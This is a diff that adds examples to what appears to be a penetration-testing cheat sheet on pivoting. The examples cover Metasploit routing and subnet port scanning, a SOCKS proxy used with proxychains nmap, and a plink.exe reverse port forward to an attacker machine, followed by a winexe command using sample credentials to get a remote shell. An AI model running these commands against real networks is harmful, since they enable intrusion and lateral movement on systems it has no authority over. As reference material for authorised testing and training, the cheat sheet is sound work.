@@ -152,8 +152,23 @@ Local port --> Compromised host (active session) --> Third\_box:Port
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
+**Example:**
+
+- Compromised machine IP: `192.168.1.10` (inside the `192.168.1.0/24` network)
+- Meterpreter session ID: `1`
+`route add 192.168.1.0 255.255.255.0 1
+You can now use Metasploit to scan, exploit, or interact with other machines in the `192.168.1.0/24` network through the compromised machine.
+
+**Example Metasploit Command:**
+```bash
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+run
+```
 
 ### SOCKS
+
+Allows **external tools** (like Nmap, web browsers, etc.) to access the internal network through the compromised host.
 
 ```bash
 background# meterpreter session
@@ -161,6 +176,8 @@ route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.2
 use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
+
+proxychains nmap -sT 10.10.10.14/24
 ```
 
 Another way:
@@ -363,6 +380,18 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 It's like a console PuTTY version ( the options are very similar to an ssh client).
 
 As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:
+
+```bash
+plink.exe <user>@<kali> -R <kali-
+port>:<target-IP>:<target-port>
+
+On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:
+plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
+
+On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead,
+and execute it to get a shell via the port forward:
+# winexe -U 'admin%password123' //localhost cmd.exe
+```
 
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
